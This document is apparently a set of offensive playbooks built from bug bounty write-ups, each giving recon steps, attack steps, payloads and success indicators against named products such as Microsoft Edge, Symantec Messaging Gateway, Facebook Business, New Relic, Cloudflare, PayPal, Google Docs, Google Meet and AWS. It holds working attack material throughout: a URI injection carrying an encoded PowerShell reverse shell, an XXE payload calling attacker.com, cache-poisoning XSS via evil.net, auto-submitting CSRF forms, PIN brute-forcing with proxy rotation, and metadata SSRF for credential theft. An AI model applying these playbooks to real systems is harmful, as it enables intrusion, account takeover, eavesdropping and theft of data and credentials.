playbooks.impact: An attacker can add users or assign roles to users within the Service Trust Portal on behalf of an authenticated administrator, potentially leading to unauthorized access or privilege escalation within Microsoft's cloud services.
playbooks.key_lesson: Always check for CSRF tokens on state-changing endpoints, especially those involving user management or administrative actions. If tokens are missing, craft an HTML form to exploit the vulnerability.

meta.title: Microsoft Edge Remote Code Execution

trigger_conditions.when_to_apply: When the target system's default handler for a custom URI scheme passes user-controlled input to an executable without proper sanitization.
prerequisites: Target user is browsing with Microsoft Edge.
Target user is tricked into clicking a malicious URI link.
The target system has vulnerable custom URI schemes registered that are handled by executables accepting command-line arguments.
applicability_signals: Discovery of custom URI schemes registered in the Windows Registry under HKEY_CLASSES_ROOT with a 'shell\open\command' subkey.
Identification of URI schemes that pass user-supplied data directly as parameters to executables (e.g., 'wshfile:' passing data to 'WScript.exe').
Existence of vulnerable script files on the system that accept parameters and execute shell commands without sanitization (e.g., 'SyncAppvPublishingServer.vbs').
skip_if: All custom URI schemes are properly sanitized before being passed to executables.
The target system has patches for known WSH injection vulnerabilities in system scripts.
No custom URI schemes are registered or they are handled by safe applications.

recon_steps: Step 1: Enumerate registered custom URI schemes in the Windows Registry by checking HKEY_CLASSES_ROOT for keys with 'shell\open\command' subkeys.
Step 2: For identified custom URI schemes, examine the associated command in 'shell\open\command' to see if user-supplied data is passed as parameters to an executable.
Step 3: Investigate system scripts (especially VBScript files) that are called by these executables for vulnerabilities related to parameter handling and shell command execution.
attack_steps: Step 1: Craft a malicious URI link using a vulnerable custom scheme, e.g., 'wshfile:test/../../<PATH_TO_MALICIOUS_SCRIPT>'.
Step 2: Entice the target user to click the malicious URI link within Microsoft Edge.

Step 3: If a path traversal is possible, leverage it to point to a system script that can be manipulated to execute arbitrary commands, e.g., 'wshfile:../../<VULNERABLE_SCRIPT_PATH>' where the script is in a predictable location.

Step 4: Modify the call to the vulnerable script to inject arbitrary commands, for example, by crafting arguments for 'SyncAppvPublishingServer.vbs' to execute PowerShell commands. Example: 'wshfile:../../<VULNERABLE_SCRIPT_PATH>?arg1=<COMMAND_INJECTION>'.
Step 5: Ensure the injected command is designed to achieve RCE, such as creating a reverse shell or downloading and executing a payload.
payloads_or_patterns: wshfile:test/../../C:/Windows/WinSxS/amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.17134.48_none_c60426fea249fc02/SyncAppvPublishingServer.vbs?arg1=powershell -enc <BASE64_ENCODED_REVERSE_SHELL_COMMAND>
tools_recommended: Registry Editor (regedit.exe) for enumerating custom URI schemes.
Process Explorer or similar tools to monitor process creation and arguments.
Burp Suite (or similar proxy) to potentially intercept or craft malicious URIs if browser interaction is automated.
success_indicators: Execution of the injected command (e.g., a reverse shell connection established, a file dropped on the system, or a specific command output observed).
The target machine's system script executes arbitrary commands as intended by the attacker.
failure_indicators: No prompt appears for the custom URI scheme, or it indicates an unknown protocol.
The executable associated with the URI scheme fails to execute the provided path or arguments correctly.
The vulnerable script does not execute arbitrary commands as expected, indicating a patch or incorrect sanitization.
A 403 Forbidden error or other security mechanism blocks the execution.

playbooks.impact: Remote Code Execution (RCE) on the target machine, allowing an attacker to run arbitrary commands with the privileges of the user running Microsoft Edge.
playbooks.key_lesson: Always investigate custom URI schemes and their registered handlers for potential command injection and path traversal vulnerabilities, paying close attention to how user-supplied data is processed by executables.

meta.title: Symantec Messaging Gateway authentication bypass

trigger_conditions.when_to_apply: When the password reset feature is enabled on the Symantec Messaging Gateway appliance.
prerequisites: Password reset feature is enabled on the appliance.
applicability_signals: Login interface with a 'Forgot password' link.
The appliance is running version 10.6.5 or prior.
skip_if: Password reset feature is disabled.
The appliance has been patched to a version beyond 10.6.5.

recon_steps: Step 1: Navigate to the Symantec Messaging Gateway login page and observe if a 'Forgot password' link is present.
Step 2: If the link is present, attempt to initiate a password reset for any valid username to confirm the feature is active and observe the request/response flow.
attack_steps: Step 1: Obtain the static encryption key and algorithm (PBEWithMD5AndDES) from previous research or source code analysis.
Step 2: Construct the string "admin:" for the username and an empty password.
Step 3: Encrypt the string "admin:" using the identified key and algorithm.
Step 4: Construct a GET request to `/brightmail/action2.do?method=passwordReset&authorization=<encrypted_string>%3d` where `<encrypted_string>` is the result from Step 3.
Step 5: Observe the response for a 302 redirect indicating a successful login.
payloads_or_patterns:
GET /brightmail/action2.do?method=passwordReset&authorization=<encrypted_admin_token>%3d HTTP/1.1
Host: <TARGET_URL>
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
tools_recommended: Burp Suite: Intercept the password reset request and modify the authorization parameter.
Custom script (Python, etc.): To automate the encryption and request generation process.
success_indicators: HTTP 302 Found status code.
Location header redirecting to `/brightmail/viewWelcome.do?userID=1`.
Receipt of a valid administrator session cookie (JSESSIONID).
failure_indicators: 400 Bad Request or other error codes indicate incorrect encryption or token format. -> Double-check encryption algorithm and static key.
No redirect or an error page indicates the password reset flow did not proceed as expected. -> Verify the 'password reset' feature is enabled and the appliance version is vulnerable.
403 Forbidden might indicate WAF blocking. -> Try encoding the authorization parameter or using alternative methods to bypass.

playbooks.impact: Attacker gains full administrative access to the Symantec Messaging Gateway, allowing them to control email security settings, monitor emails, potentially redirect or block email traffic, and tamper with system configurations.
playbooks.key_lesson: Leverage prior research for hardcoded encryption keys and algorithms to bypass authentication on appliances with predictable cryptographic implementations.

meta.title: Payment bypass

trigger_conditions.when_to_apply: This technique is applicable when the application processes payments and allows authenticated users to interact with the payment flow.
prerequisites: Attacker must have an authenticated session.
applicability_signals: The application has a functional payment processing mechanism.
The payment process involves API calls or parameters that can be manipulated.
skip_if: Payment is handled entirely by third-party providers with no application-level control.
All payment-related requests are heavily protected by robust anti-tampering mechanisms.

recon_steps: Step 1: Identify the payment processing endpoint(s) and related API calls during a legitimate transaction.
Step 2: Analyze the requests and responses for parameters that control the payment amount, status, or confirmation.
attack_steps: Step 1: Initiate a payment for a small amount.
Step 2: Intercept the request just before it's sent to the server.
Step 3: Modify the payment amount parameter to 0 or a significantly small value.
Step 4: Forward the modified request to the server.
Step 5: Observe the response to confirm if the payment was processed successfully with the manipulated amount.
payloads_or_patterns: Example: Change `amount=10.00` to `amount=0.00` in the request body or URL parameters.
tools_recommended: Burp Suite Proxy: To intercept and modify HTTP requests.
Postman: For crafting and sending custom HTTP requests.
success_indicators: The order status is updated to 'paid' or equivalent without the actual amount being debited.
A confirmation email or notification is received for a zero-value transaction.
failure_indicators: The server rejects the request with an error indicating an invalid amount (e.g., 400 Bad Request). → Try alternative parameters or check for server-side validation logic.
The request fails with a validation error related to the payment token or signature. → Investigate token generation and validation mechanisms.

playbooks.impact: An attacker can bypass payment requirements, obtaining goods or services without paying.
playbooks.key_lesson: Always validate the payment amount on the server-side, and do not rely solely on client-side manipulation of request parameters.

meta.title: Facebook Business Takeover

trigger_conditions.when_to_apply: When a user is authenticated to Facebook and can identify the target business ID and a user ID to import.
prerequisites: Attacker must have an active Facebook session.
Attacker must be able to identify a target business ID.
Attacker must be able to identify a user ID to import (can be their own or another user's).
applicability_signals: Existence of the /business/aymc_assets/admins/import/ endpoint.
The endpoint accepts POST requests with `business_id`, `admin_id`, and `session_id` parameters.
skip_if: The /business/aymc_assets/admins/import/ endpoint is not accessible or returns an error for all authenticated users.
The endpoint requires specific roles or permissions that the attacker does not possess.

recon_steps: Step 1: Identify a target Facebook Business ID.
Step 2: Identify a user ID to import as an admin (can be the attacker's own user ID).
attack_steps: Step 1: Send a POST request to `https://facebook.com/business/aymc_assets/admins/import/`
Step 2: Include the following parameters in the request body: `business_id` (target business ID), `admin_id` (user ID to import), and `session_id` (attacker's active Facebook session ID).
payloads_or_patterns:
POST /business/aymc_assets/admins/import/ HTTP/1.1
Host: facebook.com
Content-Type: application/x-www-form-urlencoded

business_id=<TARGET_BUSINESS_ID>&admin_id=<MALICIOUS_USER_ID>&session_id=<SESSION_TOKEN>
tools_recommended: Burp Suite: To craft and send the POST request, and manage session tokens.
success_indicators: The user ID specified in `admin_id` becomes an administrator of the `business_id` without prior authorization.
Gaining access to the business assets (Facebook pages, Ad accounts, applications, Instagram accounts) connected to the business.
failure_indicators: Receiving a 403 Forbidden or similar error: The endpoint may have been patched or requires specific permissions.
Receiving a 400 Bad Request: Incorrect parameter formatting or invalid IDs.

playbooks.impact: An attacker can gain administrative access to any Facebook Business account, allowing them to control associated Facebook Pages, Ad Accounts, applications, and Instagram accounts.
playbooks.key_lesson: Always verify that sensitive endpoints like admin import functionalities have proper authorization checks in place before allowing any authenticated user to perform the action.

meta.title: Get as image function pulls any Insights/NRQL data from any New Relic account (IDOR)

affected_components: /v2/nrql endpoint via the 'Get as image' feature
tech_stack_fingerprints: X-Image-Url header in responses to /v2/nrql requests

trigger_conditions.when_to_apply: When an authenticated user can access the 'Get as image' functionality on a New Relic dashboard, and the underlying API request does not properly validate the ownership of the `account_id` parameter.
prerequisites: Authenticated user session with New Relic.
applicability_signals: Presence of a 'Get as image' option on dashboard charts.
Observing a POST request to `/v2/nrql` containing `account_id` and `nrql` parameters when using the 'Get as image' feature.
The `account_id` parameter appears to be numeric and incremental.
skip_if: The 'Get as image' feature is not present.
All API requests to `/v2/nrql` with modified `account_id` return an authorization error (e.g., 401 or 403).

recon_steps: Step 1: Authenticate to New Relic and navigate to a dashboard with integrations (e.g., GCP, AWS).
Step 2: Click on the dropdown options for a chart and select 'Get as image'.
Step 3: Use browser developer tools or a proxy (like Burp Suite) to capture the POST request made to the `/v2/nrql` endpoint.
Step 4: Analyze the captured request, noting the `account_id` and `nrql` parameters. Observe the response, specifically looking for the `X-Image-Url` header.
attack_steps: Step 1: Capture a legitimate 'Get as image' request using a proxy.
Step 2: Modify the `account_id` parameter in the captured POST request to a different, likely incremental, numeric value.
Step 3: Submit the modified request.
Step 4: Analyze the response to determine if data from the targeted account is returned.
Step 5: If successful, modify the `nrql` query to exfiltrate specific data types (e.g., `SELECT * FROM SystemSample`).
Step 6: Experiment with the `?type=` parameter in the `X-Image-Url` to discover available chart types (e.g., `json`).
Step 7: Append `&height=2000` to the `X-Image-Url` to maximize data exfiltration per request.
payloads_or_patterns:
POST /v2/nrql HTTP/1.1
Host: <TARGET_HOST>
Content-Type: application/json

{"query":{"account_id":<ANY_ACCOUNT_ID>,"nrql":"SELECT count(*) FROM IntegrationError FACET dataSourceName SINCE 1 DAY AGO"},"account_id":<ANY_ACCOUNT_ID>,"endpoint":"/v2/nrql","title":"Authentication Errors"}

POST /v2/nrql HTTP/1.1
Host: <TARGET_HOST>
Content-Type: application/json

{"query":{"account_id":<ANY_ACCOUNT_ID>,"nrql":"SELECT * FROM SystemSample"},"account_id":<ANY_ACCOUNT_ID>,"endpoint":"/v2/nrql","title":"Uh oh!"}
<IMAGE_URL>?type=json&height=2000
tools_recommended: Burp Suite (Proxy for capturing requests, Intruder for fuzzing `account_id`)
success_indicators: The `X-Image-Url` header contains a URL pointing to an image.
The image content, when fetched via the `X-Image-Url` (especially with `?type=json`), contains data or JSON structured data from an account other than the user's own.
Successful retrieval of data (even if initially appearing as an empty chart) from a different `account_id`.
Discovery of valid Vizco chart types (e.g., `json`, `table`) via `?type=` parameter.
failure_indicators: 403 Forbidden or 401 Unauthorized responses when changing `account_id`.
The `X-Image-Url` consistently points to a generic error image or a default chart for the user's own account.
Requests with invalid `account_id` values result in consistent error messages without revealing any chart types or account information.

playbooks.impact: An attacker can read any NRQL data (including sensitive system metrics, error logs, and potentially PII depending on custom NRQL queries) from any New Relic account on the platform. This includes data from other customers' accounts, leading to a significant data breach.
playbooks.key_lesson: Always validate that the `account_id` in a request belongs to the authenticated user making the request, especially when accessing sensitive data or features like image generation.

meta.title: DOM-XSS Bug Affecting Tinder, Shopify, Yelp, and More

trigger_conditions.when_to_apply: When a web application processes user-supplied input in a way that is reflected unsafely in the DOM, allowing for script execution.
prerequisites: The target application must be vulnerable to DOM-based Cross-Site Scripting.
applicability_signals: The writeup mentions DOM XSS as a vulnerability, implying that user input is reflected in the DOM. Specific components or parameters are not detailed in the provided text.
skip_if: The application properly sanitizes all user input before reflecting it in the DOM, or uses secure methods for handling user-provided data that prevents script execution.

recon_steps: Step 1: Analyze JavaScript code for sinks that process user-controlled data without proper sanitization (e.g., `innerHTML`, `document.write`, `eval`).
Step 2: Identify parameters or URL fragments that are reflected directly into the DOM.
attack_steps: Step 1: Craft a payload with an XSS vector and append it to a user-controllable parameter or URL fragment.
Step 2: Navigate to the crafted URL.
Step 3: Observe if the payload is executed in the browser.
payloads_or_patterns: Example payload structure: `<TARGET_URL>/vulnerable_page#<script>alert('XSS')</script>` or `?param=<script>alert('XSS')</script>`
More advanced payloads may involve encoding or obfuscation depending on WAF or browser defenses.
tools_recommended: Burp Suite: For intercepting and modifying requests, and identifying reflected parameters.
Browser Developer Tools: For inspecting DOM, JavaScript execution, and identifying sinks.
success_indicators: An alert box appears with custom text (e.g., 'XSS').
Arbitrary JavaScript code executes in the context of the victim's browser session.
failure_indicators: The payload is escaped or rendered as plain text in the DOM.
The browser blocks the execution of the script due to security policies or a WAF.
No observable JavaScript execution occurs.

playbooks.impact: An attacker can execute arbitrary JavaScript code in the victim's browser, leading to session hijacking, data theft, phishing attacks, or defacement of the web page.
playbooks.key_lesson: Always validate and sanitize all user-supplied input that is reflected within the Document Object Model (DOM) to prevent DOM-based XSS vulnerabilities.

meta.title: Bypassing Web Cache Poisoning Countermeasures

tech_stack_fingerprints: Cloudflare cache key including specific headers
Server response with Cloudflare headers (e.g., CF-Cache-Status)

trigger_conditions.when_to_apply: When Cloudflare is acting as a CDN/WAF for a target website, and it has implemented cache key logic that includes certain headers, but has an optimization that bypasses these headers if they match the 'Host' header.
prerequisites: The target website uses Cloudflare.
Cloudflare has implemented cache key logic for headers like X-Forwarded-Host.
Cloudflare has an optimization where X-Forwarded-Host is not added to the cache key if it matches the Host header.
applicability_signals: Observing that Cloudflare WAF blocks XSS characters in headers like X-Forwarded-Host.
Observing Cloudflare's cache key logic includes specific headers.
Observing that when X-Forwarded-Host matches the Host header, it is not included in the cache key.
skip_if: The target does not use Cloudflare.
Cloudflare's cache key logic is not susceptible to duplicate header manipulation.
The backend server does not concatenate duplicate headers or mishandles concatenated header values.

recon_steps: Step 1: Identify if the target is proxied through Cloudflare (e.g., by checking DNS records, HTTP headers like CF-RAY, or IP address ranges).
Step 2: Send requests with different X-Forwarded-Host values to observe how Cloudflare's cache key is constructed and if WAF rules trigger.
attack_steps:
Step 1: Send a request to the target with a 'Host' header and a 'X-Forwarded-Host' header that matches the 'Host' header. Example: `GET / HTTP/1.1
Host: example.com
X-Forwarded-Host: example.com
...`

Step 2: In a subsequent request, send the *same* 'Host' header and 'X-Forwarded-Host' header, but add a *second* 'X-Forwarded-Host' header with the malicious payload. Example: `GET / HTTP/1.1
Host: example.com
X-Forwarded-Host: example.com
X-Forwarded-Host: <malicious_host_value>
...`

Step 3: Observe the response. If the backend server concatenates the 'X-Forwarded-Host' headers (e.g., `example.com, <malicious_host_value>`), and Cloudflare's cache key only considers the first instance when it matches the 'Host' header, then the malicious value will be used in the cache key.
payloads_or_patterns:
GET / HTTP/1.1
Host: <TARGET_URL>
X-Forwarded-Host: <TARGET_URL>
X-Forwarded-Host: evil.net

GET / HTTP/1.1
Host: <TARGET_URL>
X-Forwarded-Host: <TARGET_URL>
X-Forwarded-Host: evil.net"

<script>alert(document.domain)</script>

GET / HTTP/1.1
Host: <TARGET_URL>
X-Forwarded-Host: <TARGET_URL>
X-Forwarded-Host: evil.net,/page"

<script>alert(1)</script>
tools_recommended: Burp Suite: For crafting and sending sequential requests, and observing response differences.
Custom scripts: To automate the sending of duplicate headers and analyze cache key behavior.
success_indicators: The website returns a cached response that reflects the payload in the second 'X-Forwarded-Host' header, even though the first 'X-Forwarded-Host' header matched the 'Host' header.
For example, a link or script tag generated by the application references the `evil.net` domain instead of the original `TARGET_URL`.
The response body contains an XSS payload that executes if viewed through the poisoned cache.
failure_indicators: All requests result in a 403 Forbidden response, indicating the WAF is blocking the duplicate header.
The cache key consistently reflects the original 'Host' header, meaning the duplicate header manipulation is not effective.
The backend server does not concatenate headers or incorrectly processes them, leading to errors or unexpected behavior.

playbooks.impact: Cache poisoning leading to Cross-Site Scripting (XSS) or other client-side attacks. An attacker can poison the cache with malicious content, which is then served to other users who request the same URL. This can lead to data theft, session hijacking, or defacement.
playbooks.key_lesson: When testing web cache poisoning, consider edge cases in how CDNs/WAFs handle duplicate headers, especially when optimizations might bypass security checks based on header matching.

meta.title: Blind XML External Entities Out-Of-Band Channel Vulnerability : PayPal Case Study

tech_stack_fingerprints: PHP/Zend Engine (mentioned in sidebar, not directly applicable to the XXE itself but part of the context)

trigger_conditions.when_to_apply: When an application accepts and parses XML input, and does not sufficiently sanitize external entity references, particularly when direct feedback is not available.
prerequisites: The target application must process XML input.
The XML parser must be configured to allow external entities.
The attacker must be able to send authenticated requests to the target.
applicability_signals: Application accepts XML payloads.
Attempts to inject simple XML (e.g., inline entities) result in specific error messages or reflection points, indicating XML processing.
Direct feedback of XXE payloads in responses is not observed.
skip_if: All XML inputs are rejected with generic errors.
WAF blocks all XXE related payloads.
Direct feedback channel is confirmed to be present and usable for XXE.

recon_steps: Step 1: Send authenticated requests to the target application, observing the structure of requests and responses to identify XML payloads.
Step 2: Attempt to inject simple XML structures and observe the server's response to identify reflection points or error messages that indicate XML processing capabilities.
attack_steps: Step 1: Craft an XML payload using an external DTD to exfiltrate data via an out-of-band channel. This involves defining an external entity that references a DTD hosted on an attacker-controlled server.
Step 2: Within the external DTD, define a parameter entity that makes an HTTP request to the attacker's server, including sensitive data from the target system (e.g., local files).
Step 3: Submit the crafted XML payload as part of an authenticated request to the vulnerable component.
Step 4: Monitor the attacker-controlled server for incoming HTTP requests containing the exfiltrated data.
payloads_or_patterns:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<root>VALUE</root>
tools_recommended: Burp Suite or similar intercepting proxy to modify and send requests.
A dedicated server or collaborator tool (e.g., Burp Collaborator, Interactsh) to receive out-of-band callbacks.
success_indicators: An HTTP request is received on the attacker's server from the target's IP address, containing sensitive data in the URL or headers.
The response from the target application indicates an internal server error or a similar non-standard response, correlating with the timing of the out-of-band callback.
failure_indicators: No callback is received on the attacker's server after submitting the payload.
The target application returns a standard error message without any outbound connection attempts.
The XML payload is rejected or sanitized before processing.

playbooks.impact: Disclosure of sensitive data from the PayPal server's file system or internal network resources. The vulnerable server can be used to attack internal systems or other external services, leading to potential unauthorized access, data breaches, or further compromise of the organization's infrastructure.
playbooks.key_lesson: When an XML parser exhibits XXE vulnerabilities and lacks a direct feedback channel, leverage out-of-band techniques by using external DTDs to exfiltrate data to an attacker-controlled server.

meta.title: Clickjacking in Google Docs and Voice typing feature

affected_components: Public Google Docs embedded in iframes

trigger_conditions.when_to_apply: When a Google Docs page can be embedded in an iframe on a different domain and its content, particularly features like voice typing, can be interacted with via clickjacking.
prerequisites: The target Google Doc must be publicly accessible or shareable.
The attacker must be able to host a webpage capable of embedding the Google Doc in an iframe.
applicability_signals: Google Docs page does not have 'X-Frame-Options' or 'Content-Security-Policy: frame-ancestors' headers restricting framing.
The 'Voice typing' feature is present and accessible within Google Docs.
skip_if: Google Docs implements strict framing policies preventing embedding in iframes.
The voice typing feature requires specific user interactions that cannot be achieved via clickjacking.

recon_steps: Step 1: Visit a Google Docs document (e.g., a public or shareable one) and inspect the HTTP response headers for 'X-Frame-Options' and 'Content-Security-Policy'. Confirm they do not restrict framing.
Step 2: Identify interactive features within Google Docs that could be exploited, such as the 'Voice typing' feature.
attack_steps: Step 1: Create a malicious HTML page on an attacker-controlled server. This page will contain an iframe pointing to a specific Google Docs document.
Step 2: Configure the iframe to allow microphone access: `<iframe src="<TARGET_DOC_URL>" allow="microphone *"></iframe>`.
Step 3: Overlay invisible UI elements (e.g., buttons, links) on the attacker's page that align with sensitive actions on the embedded Google Doc (like enabling voice typing).
Step 4: Trick the victim into visiting the attacker's malicious page.

Step 5: When the victim interacts with the attacker's page (e.g., clicks a button, moves the mouse), it triggers an action within the embedded Google Doc via the iframe, potentially enabling voice typing and recording.
payloads_or_patterns: <iframe src="https://docs.google.com/document/d/1VIhSkvFKar2bwHjORiI3GPT2wYWZ10P7QP42FpLrxY0/edit" allow="microphone *"></iframe>
tools_recommended: Burp Suite: To analyze HTTP headers and test for framing vulnerabilities.
Simple HTML server: To host the attacker's malicious page.
success_indicators: The attacker's webpage successfully embeds the Google Doc in an iframe without same-origin policy restrictions.
Voice typing within the embedded Google Doc can be initiated and recorded without explicit user action on the Google Docs interface itself, but through interaction with the attacker's page.
Private conversations are recorded via the victim's microphone.
failure_indicators: The Google Doc fails to load in the iframe, or displays a framing restriction error (e.g., 'Refused to display...'). This indicates strong CSP or X-Frame-Options policies are in place. Pivot: Look for other Google services or features that might be vulnerable to clickjacking.

Voice typing cannot be activated through the clickjacking mechanism. This could mean the UI elements do not align correctly or the feature requires explicit user consent not bypassable via this method. Pivot: Re-evaluate the overlaying strategy or explore alternative interactive features within Google Docs.

playbooks.impact: An attacker can trick a victim into enabling the voice typing feature in Google Docs without their explicit consent, leading to the unauthorized recording of private conversations. This exploits the trust users place in Google Docs to perform sensitive actions surreptitiously.
playbooks.key_lesson: Always check for the presence and configuration of 'X-Frame-Options' and 'Content-Security-Policy' headers on web applications, especially those with interactive features, as they are crucial for preventing clickjacking attacks.

meta.title: GoogleMeetRoulette: Joining random meetings

tech_stack_fingerprints: Phone numbers associated with Google Meet meetings

trigger_conditions.when_to_apply: This technique is applicable when Google Meet meetings are accessible via a phone number and a 4-digit PIN, allowing for potential brute-force or enumeration of meeting credentials.
prerequisites: Target organization uses G-Suite with Enterprise license for Google Meet.
The 'call-in' feature is enabled for Google Meet meetings, providing a phone number and PIN.
applicability_signals: Google Meet meeting invitation includes a dial-in phone number and a 4-digit PIN.
Ability to create a Google Meet meeting and observe its associated dial-in information.
skip_if: Google Meet meetings exclusively use link-based access without a dial-in option.
Dial-in PINs are extremely long or use complex character sets making brute-force infeasible.
Rate limiting on dial-in attempts is severe, preventing successful brute-force.

recon_steps: Step 1: Research Google Meet's 'call-in' feature to understand its authentication mechanism (phone number + PIN).
Step 2: Attempt to generate multiple Google Meet meetings to observe patterns in assigned phone numbers and PINs.
Step 3: Collect dial-in phone numbers from publicly available sources or by brute-forcing common patterns.
attack_steps: Step 1: Programmatically dial a discovered Google Meet phone number.
Step 2: Upon hearing the initial greeting sound (indicating a valid phone number), proceed to brute-force the 4-digit PIN.
Step 3: Iterate through all possible 4-digit PIN combinations (0000-9999) for each discovered phone number.
Step 4: If a correct PIN is entered, the attacker will be connected to the Google Meet meeting.
payloads_or_patterns: Brute-force sequence: 0000, 0001, ..., 9999 (for PINs)
Phone number patterns: Specific country codes, area codes known to be associated with the target organization.
tools_recommended: Custom scripting (Python with libraries like `telepot` or `pjsip` for VoIP integration) for automated dialing and PIN brute-forcing.
Burp Suite for intercepting and analyzing any potential web requests related to meeting access if applicable.
success_indicators: Successful connection to a Google Meet meeting without prior invitation or authorization.
Hearing the voices of participants in the meeting.
Ability to speak and be heard in the meeting (if the feature allows for microphone input).
Observing meeting details or participants that were not expected to be accessible.
failure_indicators: Disconnected call after entering an incorrect PIN.
Receiving an automated message indicating an invalid PIN or meeting.
Meeting room not picking up or going directly to voicemail.
If a rate limit is encountered, pause brute-force for a period and consider proxy rotation or slower attempts.

playbooks.impact: Unauthorized access to confidential business meetings, potentially leading to the exposure of sensitive information such as financial data, strategic plans, intellectual property, and customer details.
playbooks.key_lesson: Always investigate the authentication and authorization mechanisms of auxiliary communication features like voice call-ins, as they might bypass standard web application security controls and be susceptible to brute-force or enumeration attacks.

meta.title: An interesting Google vulnerability that got me 3133.7 reward.

trigger_conditions.when_to_apply: This technique applies when an authenticated user can perform sensitive actions on the Google Workspace Admin Console without sufficient CSRF protection on certain endpoints.
prerequisites: Attacker has a Google account and can trick the victim into visiting a malicious URL.
applicability_signals: The target application is Google Workspace Admin Console.
Discovery of endpoints within the Admin Console that perform state-changing actions.
Absence of anti-CSRF tokens or insufficient validation of the Origin header for these endpoints.
skip_if: All sensitive endpoints are protected by valid anti-CSRF tokens that are validated server-side.
The application strictly validates the `Origin` header, rejecting requests from non-whitelisted origins.

recon_steps: Step 1: Analyze network traffic within the Google Workspace Admin Console to identify endpoints that perform sensitive actions (e.g., user creation, group modification, application settings changes).
Step 2: For each identified endpoint, examine HTTP requests for the presence and validation of anti-CSRF tokens.
Step 3: Check if the `Origin` header is being validated by the server. If it is, observe which origins are permitted.
attack_steps: Step 1: Craft a malicious HTML page that includes a form or JavaScript to submit a POST request to the vulnerable endpoint in the Google Workspace Admin Console.
Step 2: The request should contain the necessary parameters for the sensitive action, but crucially, it will not have a valid anti-CSRF token.
Step 3: Embed the crafted HTML into a link and send this link to the victim.

Step 4: When the victim, who is already logged into their Google Workspace account, clicks the link and the malicious page loads, the browser will automatically submit the crafted request to the Google Admin Console.
Step 5: The Admin Console, if vulnerable, will process the request as if it came from the logged-in user, performing the sensitive action without their explicit consent.
payloads_or_patterns:
<html>
<body>
<form id="csrfForm" action="<TARGET_URL>/admin/endpoint" method="POST">
<input type="hidden" name="parameter1" value="value1"/>
<input type="hidden" name="parameter2" value="value2"/>
</form>
<script>
 document.getElementById('csrfForm').submit();
</script>
</body>
</html>
tools_recommended: Burp Suite: To intercept and analyze HTTP requests, identify potential CSRF vulnerabilities, and craft malicious payloads.
A simple web server (e.g., Python's http.server): To host the crafted HTML page for delivery to the victim.
success_indicators: The sensitive action is performed successfully in the Google Workspace Admin Console without the user interacting with the console directly (e.g., a new user is created, a setting is changed).
The attacker can verify the change by inspecting the Admin Console or through other means.
failure_indicators: A 403 Forbidden error is returned, or the action is not performed, indicating the presence of CSRF protection.
A redirection to a login page or an error page specific to unauthorized actions.

playbooks.impact: An attacker can perform sensitive administrative actions on a victim's Google Workspace domain without their knowledge or consent. This could lead to data breaches, unauthorized access, disruption of services, or other malicious activities depending on the compromised endpoint.
playbooks.key_lesson: Always implement and validate robust CSRF protection, including anti-CSRF tokens and strict `Origin` header validation, for all state-changing requests in web applications, especially administrative interfaces.

meta.title: AWS takeover through SSRF in JavaScript
meta.programs: Private bug bounty program on Hackerone

target_profile.technology: Custom macro language (Banan++) implemented in JavaScript
tech_stack_fingerprints: Eval() function usage in custom JavaScript

trigger_conditions.when_to_apply: When a web application processes user-supplied input within a custom JavaScript macro language that uses an `eval()` function without proper sanitization.
prerequisites: Attacker must have an authenticated session.
The target application must use a custom JavaScript macro language for processing parameters.
A specific parameter (e.g., 'operation') must accept user-controlled input which is then processed by the vulnerable `eval()` function.
applicability_signals: Existence of a JavaScript file with the name 'banan++.js' or similar custom macro language interpreter.
Discovery of a function within the JavaScript code that uses `eval()` for string evaluation.
An endpoint that accepts POST requests with a parameter (e.g., 'operation') that is part of the custom macro language processing.
The 'operation' parameter takes string inputs that are evaluated.
skip_if: Input validation or sanitization is strictly enforced on the 'operation' parameter, preventing injection of arbitrary code.
The `eval()` function is not present in the accessible JavaScript code, or it's used in a safe context.
All requests to the target endpoint are blocked by a WAF or return unauthorized errors for authenticated users.

recon_steps: Step 1: Analyze the application's JavaScript files, looking for custom scripting or macro languages, and identify functions that use `eval()`.
Step 2: Search Burp Suite history for POST parameters that seem to use the custom macro language, such as 'operation' used in the writeup.
attack_steps: Step 1: Identify the vulnerable `Union()` function in the `banan++.js` file, which contains `eval(value + symbol + arg)`.
Step 2: Locate an injection point by finding a POST endpoint that uses the custom macro language, such as `POST /<REDACTED>` with the `operation` parameter.
Step 3: Craft a payload to inject into the `operation` parameter. Start with simple injections like `Union('alert()//', '2', '3')` to test for basic code execution.

Step 4: Once code execution is confirmed (e.g., via chained `alert()` calls if applicable, or by observing application behavior changes), pivot to SSRF. The writeup mentions dumping AWS credentials, which implies the JavaScript environment has network access and the ability to make HTTP requests.

Step 5: Develop an SSRF payload that leverages the `eval()` vulnerability to make internal HTTP requests to AWS metadata endpoints (e.g., `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>`). This would likely involve understanding how the Banan++ language can construct URLs and perform HTTP requests.
Step 6: Analyze the response from the SSRF request to extract sensitive information, such as AWS access keys, secret access keys, and session tokens.
Step 7: Use the extracted credentials to gain unauthorized access to AWS resources (e.g., S3 buckets, EC2 instances).
payloads_or_patterns: Example SSRF payload structure (conceptual, requires knowledge of Banan++'s HTTP capabilities): <Banan++ function to make HTTP request>('http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>')
The actual payload to achieve SSRF would involve constructing an expression within the `operation` parameter that, when `eval`uated, makes an HTTP request to the AWS metadata endpoint.
tools_recommended: Burp Suite: For intercepting and modifying requests, searching historical requests, and identifying injection points.
Browser Developer Tools: For analyzing JavaScript code, debugging, and observing application behavior.
JavaScript Beautifier/Deobfuscator: To make minified JavaScript more readable.
success_indicators: Observing `alert()` boxes (if client-side code execution is verified).
Receiving a callback on a controlled server if the SSRF payload can be configured to send data externally.
Successful extraction of AWS credentials (Access Key ID, Secret Access Key, Session Token) from the application's response.
Ability to authenticate to AWS using the compromised credentials and access resources like S3 buckets or EC2 instances.
failure_indicators: Receiving a 'Parse error' or similar validation message from the server for malformed `operation` parameters.
No observable change in application behavior or `alert()` prompts when attempting simple injections.
HTTP requests to internal IPs like `169.254.169.254` are blocked or return generic error messages, indicating an SSRF filter or network restriction.
Responses indicate that the `eval()` function is not being used to execute arbitrary code in the intended context.

playbooks.impact: Full compromise of the AWS account, including access to 20 S3 buckets and 80 EC2 instances.
